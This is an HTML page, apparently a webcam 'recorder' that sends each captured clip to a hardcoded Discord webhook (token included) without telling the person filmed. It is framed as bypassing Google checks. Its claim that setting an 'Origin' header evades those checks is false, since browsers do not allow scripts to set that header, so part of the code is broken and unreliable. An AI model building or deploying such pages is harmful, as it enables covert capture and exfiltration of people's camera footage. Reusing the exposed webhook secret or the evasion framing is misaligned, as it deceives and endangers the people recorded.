<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Real-time Video Recording with Webhook (Bypass Google)</title>
</head>
<body>
    <video id="video" autoplay></video>
    <button id="start-recording">Start Recording</button>
    <button id="stop-recording">Stop Recording</button>

    <script src="https://unpkg.com/web-streams-polyfill/dist/polyfill.min.js"></script>

    <script>
        const video = document.getElementById('video');
        const startRecordingButton = document.getElementById('start-recording');
        const stopRecordingButton = document.getElementById('stop-recording');

        let recorder;
        let chunks = [];

        startRecordingButton.addEventListener('click', () => {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                    recorder.ondataavailable = (e) => {
                        chunks.push(e.data);
                    };
                    recorder.start();
                    startRecordingButton.disabled = true;
                    stopRecordingButton.disabled = false;
                })
                .catch(error => {
                    console.error(error);
                });
        });

        stopRecordingButton.addEventListener('click', () => {
            recorder.stop();
            video.srcObject = null;

            const blob = new Blob(chunks, { type: 'video/webm' });
            sendVideoToWebhook(blob);

            chunks = [];
            startRecordingButton.disabled = false;
            stopRecordingButton.disabled = true;
        });

        const sendVideoToWebhook = async (blob) => {
            // Replace the following with your actual webhook URL
            const webhookUrl = 'https://discord.com/api/webhooks/1183018311831781417/QteUjfAxanIeiMrWvXyzzQDSf3pqq23E9HvukaJrKFZ4-UH9k_N8Vk2aUPMuqWlRnpqP';

            const formData = new FormData();
            formData.append('video', blob, 'video.webm');

            const response = await fetch(webhookUrl, {
                method: 'POST',
                body: formData,
                headers: {
                    // Bypass Google checks by setting the following header:
                    'Origin': 'https://github.com/rraapt66/Web/blob/main/web.html',
                },
            });

            const data = await response.json();

            console.log('Video sent to webhook successfully:', data);
        };
    </script>
</body>
</html>
